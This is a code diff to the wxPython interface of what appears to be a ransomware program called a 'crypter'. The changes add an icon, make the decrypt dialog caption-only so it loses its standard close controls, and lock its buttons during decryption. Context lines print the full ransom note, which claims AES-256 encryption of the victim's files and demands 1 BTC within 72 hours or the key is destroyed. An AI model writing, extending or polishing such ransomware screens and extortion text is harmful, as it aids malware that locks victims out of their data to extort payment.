@@ -46,6 +46,10 @@ class MyFrame1 ( wx.Frame ):
         
         wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 900,700 ), style = wx.CAPTION|wx.TAB_TRAVERSAL|wx.STAY_ON_TOP|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.CLOSE_BOX )
         
+        # Update the icon
+        # todo Add a better icon here
+        self.SetIcon(wx.IconFromBitmap(wx.Bitmap(u"%s\\crypter_logo_small.bmp" % self.image_path, wx.BITMAP_TYPE_ANY)))
+        
         self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
         
         bSizer1 = wx.BoxSizer( wx.HORIZONTAL )
@@ -129,6 +133,7 @@ class MyFrame1 ( wx.Frame ):
         
         bSizer25 = wx.BoxSizer( wx.VERTICAL )
         
+        # todo put this message in the base class
         self.m_staticText13 = wx.StaticText( self.m_panel46, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption. \n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server\n\nTo acquire this key, transfer a total of 1 BTC to the Bitcoin wallet address below within 72 hours. \n\nIf you fail to take action within this window, the decryption key will be destroyed and access to your files will be permanently lost.", wx.DefaultPosition, wx.DefaultSize, 0 )
         self.m_staticText13.Wrap( 400 )
         self.m_staticText13.SetFont( wx.Font( 12, 74, 90, 90, False, "Lucida Sans Unicode" ) )
@@ -366,7 +371,7 @@ class MyDialog1 ( wx.Dialog ):
     def __init__( self, parent, decrypter ):
         self.decrypter = decrypter
         self.parent = parent
-        wx.Dialog.__init__ ( self, self.parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.DEFAULT_DIALOG_STYLE|wx.STAY_ON_TOP )
+        wx.Dialog.__init__ ( self, self.parent, id = wx.ID_ANY, title = wx.EmptyString, pos = wx.DefaultPosition, size = wx.Size( 500,200 ), style = wx.CAPTION|wx.STAY_ON_TOP )
         
         self.SetSizeHintsSz( wx.DefaultSize, wx.DefaultSize )
         
@@ -449,6 +454,10 @@ class MyDialog1 ( wx.Dialog ):
             self.m_staticText6.SetLabelText("Decrypting! Please Wait")
             
         # Now start the decryption 
+        # Disable disable buttons
+        self.m_sdbSizer1OK.Disable()
+        self.m_sdbSizer1Cancel.Disable()
+
         # Get list of encrypted files and update the Gauge max value
         encrypted_file_list = self.decrypter.get_encrypted_file_list()
         self.m_gauge1.SetRange(len(encrypted_file_list))
@@ -465,9 +474,9 @@ class MyDialog1 ( wx.Dialog ):
         self.m_staticText6.SetLabelText("Decryption Complete!")
         self.decrypter.cleanup()
         
-        # Disable decrypt button
-        self.m_sdbSizer1OK.Disable()
-
+        # Re-enable button
+        self.m_sdbSizer1Cancel.Enable()
+        
         # Update main window
         self.parent.m_timer2.Stop()
         self.parent.m_bitmap5.SetBitmap(wx.Bitmap( u"%s\\decrypt_message.bmp" % self.parent.image_path, wx.BITMAP_TYPE_ANY))
@@ -478,8 +487,7 @@ class MyDialog1 ( wx.Dialog ):
         self.parent.m_button11.Disable()
         
         
-        
     def __del__( self ):
         pass
     
-
+    
